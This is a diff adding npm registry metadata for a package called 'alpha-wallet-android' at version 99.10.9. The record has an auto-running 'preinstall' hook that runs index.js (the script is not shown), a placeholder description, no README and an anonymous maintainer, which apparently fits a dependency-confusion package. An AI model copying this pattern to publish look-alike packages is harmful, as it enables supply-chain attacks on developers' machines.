@@ -1,0 +1,62 @@
+{
+    "_id": "alpha-wallet-android",
+    "name": "alpha-wallet-android",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "alpha-wallet-android",
+            "version": "99.10.9",
+            "description": "difbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "alpha-wallet-android@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-O1rFgqgig/YXE4Gjk80sTRzRLa3FExgX9zqyhC0ZJqro4fDPEaOTAxAnchxpOoROUcBho+tm749ksRhqf3uFkw==",
+                "shasum": "101adfc15b75fc2b77201aca393c5e2511862133",
+                "tarball": "https://registry.npmjs.org/alpha-wallet-android/-/alpha-wallet-android-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 6719,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQyF1ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmo6DA/9EMtDRdfmtPVpBlkx8Kb3mXL3Imd34O6aZEObzSnRjEJUFKCB\r\n97ZUpdZ7pRYbCUYdSVVnGwgJ0TQBrMc4iVlH8wMZfkJEA/tWAEYTvMwZeWi7\r\nCSxi/UhdFsZeOHr5CudytIMV4m08IWNVcZxY97Z0EGBfRR9dgdjkfThpZw1L\r\nsaC2+g3XTiflPm6Rjj3tzfLPDvoz7OWgTOKwmxec2NsGpgIdLNGbHTj07TFD\r\nV8LFksfoJAC9MTsTJ5618VwqA7duMxOyv1MNKP76PjdfTCk7ysjSOuzAO2tP\r\nS8Ww/KDns4weXFo6PlBgvO3/D2FbT53JgWkG4I03rrmpeXKFn2VD5lvRX+3p\r\nDRijsmUCEuLFfmSViezbMR9E0ycq/f00XhdBoCw3BGrowL46EYDXDvPBTRgn\r\nMcjLrmZdQHalLxrlCrOKJ73CNCO2xm/o3TiFEbegZ8nP58OXCXWlAqAGp0yZ\r\nEJ+DUaI/Z/lHjErorRpTa4OYniEOHAKx+wTp2nBvGVTJ8Tvd1hMFL6HHgl1i\r\nVkAYrWgD4oe4Lc/IXXg+9GQN4izfJELrSbtquwCtOZ5sZ48GG0tmuZ8dPb1/\r\ndFfMWEC06f4Z7qsH0TGkrk8sRwwLW1P7YwPbu+2gTrNaXzlfbXEGwbCCdIfB\r\nyX6lEdQ13JxAudhE9v/DSeiZappViywTYoU=\r\n=Iruu\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "ow90xs7x",
+                "email": "ow90xs7x@33mail.ga"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "ow90xs7x",
+                    "email": "ow90xs7x@33mail.ga"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/alpha-wallet-android_99.10.9_1648566645629_0.24579340225892432"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-29T15:10:45.628Z",
+        "99.10.9": "2022-03-29T15:10:45.785Z",
+        "modified": "2022-03-29T15:10:45.933Z"
+    },
+    "maintainers": [
+        {
+            "name": "ow90xs7x",
+            "email": "ow90xs7x@33mail.ga"
+        }
+    ],
+    "description": "difbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
